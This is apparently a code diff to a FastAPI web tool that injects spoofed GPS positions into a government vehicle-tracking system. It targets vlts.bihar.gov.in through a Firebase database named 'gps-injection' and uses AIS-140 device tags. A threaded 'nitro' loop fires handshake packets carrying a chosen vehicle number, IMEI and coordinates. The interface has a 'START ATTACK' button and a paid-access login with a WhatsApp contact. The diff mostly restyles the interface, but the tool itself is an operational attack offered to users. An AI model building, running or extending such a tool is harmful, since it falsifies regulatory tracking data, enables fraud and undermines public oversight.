@@ -9,7 +9,7 @@ from fastapi.responses import HTMLResponse
 
 app = FastAPI()
 
-# --- 1. CONFIGURATION (UNCHANGED) ---
+# --- 1. CONFIGURATION (STRICTLY UNCHANGED) ---
 TAGS = ["RA18", "WTEX", "MARK", "ASPL", "LOCT14A", "ACT1", "AMAZON", "BBOX77", "EGAS", "MENT", "MIJO", "ROADRPA", "GRL"]
 DB_URL = "https://ghop-ghop-gps-injection-default-rtdb.firebaseio.com"
 TARGET_DOMAIN = "vlts.bihar.gov.in"
@@ -20,7 +20,7 @@ stop_event.set()
 packet_count = 0
 executor = ThreadPoolExecutor(max_workers=25)
 
-# --- 2. ENGINE LOGIC (UNCHANGED - AS PER YOUR CODE) ---
+# --- 2. ENGINE LOGIC (STRICTLY UNCHANGED) ---
 def sync_to_firebase(vno, data):
     try:
         with httpx.Client() as client:
@@ -49,7 +49,7 @@ def nitro_firing_loop(v_up, i, lt, ln, t_up):
             executor.submit(handshake_worker, tag, i, v_up, lt, ln)
         time.sleep(0.05)
 
-# --- 3. API ROUTES (UNCHANGED) ---
+# --- 3. API ROUTES ---
 @app.get("/init")
 async def init(v:str, i:str, lt:str, ln:str, t:str, background_tasks: BackgroundTasks):
     global packet_count
@@ -77,7 +77,7 @@ async def fetch_api(vno: str):
         if data: return {"found": True, "imei": data.get('IMEI_No'), "lat": data.get('Lat'), "lon": data.get('Lon')}
     return {"found": False}
 
-# --- 4. UPDATED UI (WITH LOGIN & WHATSAPP) ---
+# --- 4. CLEAN UI (NO YELLOW STRIP, FIXED UNDEFINED) ---
 @app.get("/", response_class=HTMLResponse)
 async def home():
     return """
@@ -87,19 +87,20 @@ async def home():
     <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
     <style>
         * { box-sizing: border-box; }
-        body { background:#000; color:#0f0; font-family:monospace; margin:0; display:flex; flex-direction:column; align-items:center; min-height:100vh; overflow-x:hidden; }
+        body { background:#000; color:#0f0; font-family:monospace; margin:0; display:flex; flex-direction:column; align-items:center; min-height:100vh; }
         .login-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #000; z-index: 999; display: flex; flex-direction: column; justify-content: center; align-items: center; padding: 20px; }
         .login-box { width: 100%; max-width: 350px; border: 2px solid #0f0; padding: 30px; border-radius: 15px; box-shadow: 0 0 20px #0f0; text-align: center; }
-        .header { width: 100%; padding: 10px 20px; display: flex; justify-content: space-between; align-items: center; background: #111; border-bottom: 1px solid #0f0; font-size: 12px; }
+        .header { width: 100%; max-width: 440px; padding: 15px 10px; display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid #333; margin-top: 10px; }
         .dashboard { width:95%; max-width:440px; border:2px solid #0f0; padding:15px; background:rgba(0,10,0,0.95); border-radius:15px; box-shadow: 0 0 25px #0f0; margin-top:10px; text-align:center; }
-        .admin-msg { background: yellow; color: black; font-weight: bold; padding: 5px; width: 100%; font-size: 11px; margin-bottom: 5px; }
-        .audit-grid { display: grid; grid-template-columns: repeat(4, 1fr); gap: 5px; margin-bottom: 10px; }
-        .audit-item { border: 1px solid #0f0; padding: 5px; font-size: 9px; border-radius: 5px; }
+        .admin-msg-box { color: yellow; font-size: 11px; margin-bottom: 10px; border: 1px dashed yellow; padding: 5px; width: 100%; }
+        .audit-grid { display: grid; grid-template-columns: repeat(4, 1fr); gap: 5px; margin-bottom: 15px; }
+        .audit-item { border: 1px solid #0f0; padding: 5px; font-size: 9px; border-radius: 5px; background: rgba(0,255,0,0.05); }
         .audit-item b { display: block; font-size: 12px; color: #fff; }
         input, select { width:100%; background:#000; border:1px solid #333; color:#0f0; padding:12px; margin-top:10px; outline:none; text-transform:uppercase; font-size:16px; border-radius:5px; }
-        button { width:100%; padding:14px; margin-top:10px; cursor:pointer; border:1px solid #0f0; background:transparent; color:#0f0; font-weight:bold; border-radius:5px; }
-        #map { width:100%; height:180px; margin-top:10px; border:1px solid #0f0; border-radius:10px; }
-        .wa-btn { margin-top: 20px; color: #25D366; cursor: pointer; text-decoration: underline; font-size: 14px; font-weight: bold; }
+        button { width:100%; padding:14px; margin-top:10px; cursor:pointer; border:1px solid #0f0; background:transparent; color:#0f0; font-weight:bold; border-radius:5px; transition: 0.3s; }
+        button:active { background: #0f0; color: #000; }
+        #map { width:100%; height:180px; margin-top:15px; border:1px solid #0f0; border-radius:10px; }
+        .wa-link { margin-top: 15px; color: #25D366; cursor: pointer; text-decoration: underline; font-size: 13px; }
     </style></head><body>
 
     <div id="loginPage" class="login-overlay">
@@ -111,33 +112,46 @@ async def home():
                 <label><input type="checkbox" id="remMe"> Remember Me</label>
             </div>
             <button onclick="doLogin()" style="background:#0f0; color:#000; margin-top:20px;">ACCESS SYSTEM</button>
-            <div class="wa-btn" onclick="window.open('https://wa.me/917464010787?text=Hello%20Admin,%20I%20need%20access.')">CONTACT US ON WHATSAPP</div>
+            <div class="wa-link" onclick="window.open('https://wa.me/917464010787')">CONTACT US ON WHATSAPP</div>
         </div>
     </div>
 
-    <div id="mainUI" style="display:none; width:100%;">
-        <div class="header"><span>USER: <b id="u_name">---</b></span><span style="color:#f00; cursor:pointer;" onclick="logout()">LOGOUT</span></div>
-        <div id="adminMsg" class="admin-msg">FETCHING ADMIN MESSAGE...</div>
+    <div id="mainUI" style="display:none; width:100%; max-width:440px;">
+        <div class="header">
+            <span>USER: <b id="u_name" style="color:white;">---</b></span>
+            <span style="color:#f00; cursor:pointer; font-weight:bold;" onclick="logout()">LOGOUT</span>
+        </div>
+        
         <div class="dashboard">
+            <div id="adminMsg" class="admin-msg-box">LOADING SYSTEM COMMANDS...</div>
+            
             <div class="audit-grid">
                 <div class="audit-item">OK<b id="a_ok">0</b></div>
                 <div class="audit-item">FAIL<b id="a_fail">0</b></div>
                 <div class="audit-item">ERR<b id="a_err">0</b></div>
                 <div class="audit-item">TOTAL<b id="a_total">0</b></div>
             </div>
+
             <input type="text" id="v" onblur="smartFetch()" placeholder="VEHICLE NUMBER">
             <input type="text" id="i" placeholder="IMEI">
             <div style="display:flex;gap:5px;"><input type="text" id="lt" placeholder="LAT"><input type="text" id="ln" placeholder="LON"></div>
+            
             <select id="tagSel"><option value="ALL">ALL TAGS (AIS-140)</option>""" + "".join([f'<option value="{t}">{t}</option>' for t in TAGS]) + """</select>
+            
             <div style="text-align:right; margin:10px 0; color:#fff; font-size:11px;">
                 <label>Use Profile Default Location <input type="checkbox" id="useDef"></label>
             </div>
+
             <button onclick="getLocation()" style="border-style:dashed;font-size:11px;">[[ GET CURRENT LOCATION ]]</button>
             <button onclick="st()" id="startBtn" style="background:#0f0;color:#000;font-size:18px;">START ATTACK</button>
             <button onclick="sp()" style="color:red;border-color:red;">ABORT</button>
-            <button onclick="resetSys()" style="color:yellow;border-color:yellow;font-size:11px;">[[ RESET SYSTEM ]]</button>
+            <button onclick="resetSys()" style="color:yellow;border-color:yellow;font-size:11px;">RESET SYSTEM</button>
+            
             <div id="map"></div>
-            <div style="display:flex;justify-content:space-between;margin-top:10px;font-size:12px;"><span>SENT: <b id="c">0</b></span><span id="st_text" style="color:lime">IDLE</span></div>
+            <div style="display:flex;justify-content:space-between;margin-top:15px;font-size:13px;">
+                <span>SENT: <b id="c">0</b></span>
+                <span id="st_text" style="color:lime">IDLE</span>
+            </div>
         </div>
     </div>
 
@@ -165,7 +179,7 @@ async def home():
                 if(u && u.password == p) {
                     if(document.getElementById('remMe').checked) localStorage.setItem('nitro_creds', JSON.stringify({m,p}));
                     currentUser = m;
-                    document.getElementById('u_name').innerText = u.name;
+                    document.getElementById('u_name').innerText = u.name || m;
                     document.getElementById('loginPage').style.display = 'none';
                     document.getElementById('mainUI').style.display = 'block';
                     initMap(); startSync();
@@ -174,9 +188,13 @@ async def home():
         }
 
         function logout() { localStorage.removeItem('nitro_creds'); location.reload(); }
-        function initMap() { map = L.map('map').setView([25.63, 84.78], 13); L.tileLayer('https://{s}.tile.openstreetmap.fr/hot/{z}/{x}/{y}.png').addTo(map); marker = L.marker([25.63, 84.78]).addTo(map); }
-        function getLocation() { navigator.geolocation.getCurrentPosition(p=>{ document.getElementById('lt').value = p.coords.latitude.toFixed(7); document.getElementById('ln').value = p.coords.longitude.toFixed(7); map.setView([p.coords.latitude, p.coords.longitude], 15); marker.setLatLng([p.coords.latitude, p.coords.longitude]); }); }
         
+        function initMap() { 
+            map = L.map('map').setView([25.63, 84.78], 13); 
+            L.tileLayer('https://{s}.tile.openstreetmap.fr/hot/{z}/{x}/{y}.png').addTo(map); 
+            marker = L.marker([25.63, 84.78]).addTo(map); 
+        }
+
         function startSync() {
             setInterval(() => {
                 fetch('/status').then(r=>r.json()).then(d=> {
@@ -193,7 +211,9 @@ async def home():
                         document.getElementById('a_total').innerText = (ad.ok||0)+(ad.fail||0)+(ad.error||0);
                     }
                 });
-                fetch(`${DB}/Admin_Settings.json`).then(r=>r.json()).then(s=>{ if(s) document.getElementById('adminMsg').innerText = s.message; });
+                fetch(`${DB}/Admin_Settings.json`).then(r=>r.json()).then(s=>{ 
+                    if(s) document.getElementById('adminMsg').innerText = s.message; 
+                });
             }, 2000);
         }
 
@@ -208,7 +228,21 @@ async def home():
                 map.setView([lat, lon], 15); marker.setLatLng([lat, lon]);
             }
         }
-        function st() { let v=document.getElementById('v').value, i=document.getElementById('i').value, lt=document.getElementById('lt').value, ln=document.getElementById('ln').value, t=document.getElementById('tagSel').value; fetch(`/init?v=${v}&i=${i}&lt=${lt}&ln=${ln}&t=${t}`); }
+
+        function getLocation() { 
+            navigator.geolocation.getCurrentPosition(p=>{ 
+                document.getElementById('lt').value = p.coords.latitude.toFixed(7); 
+                document.getElementById('ln').value = p.coords.longitude.toFixed(7); 
+                map.setView([p.coords.latitude, p.coords.longitude], 15); 
+                marker.setLatLng([p.coords.latitude, p.coords.longitude]); 
+            }); 
+        }
+
+        function st() { 
+            let v=document.getElementById('v').value, i=document.getElementById('i').value, lt=document.getElementById('lt').value, ln=document.getElementById('ln').value, t=document.getElementById('tagSel').value; 
+            fetch(`/init?v=${v}&i=${i}&lt=${lt}&ln=${ln}&t=${t}`); 
+        }
+        
         function sp() { fetch('/stop'); }
         function resetSys() { fetch('/stop'); document.getElementById('v').value=''; document.getElementById('i').value=''; document.getElementById('lt').value=''; document.getElementById('ln').value=''; }
     </script></body></html>
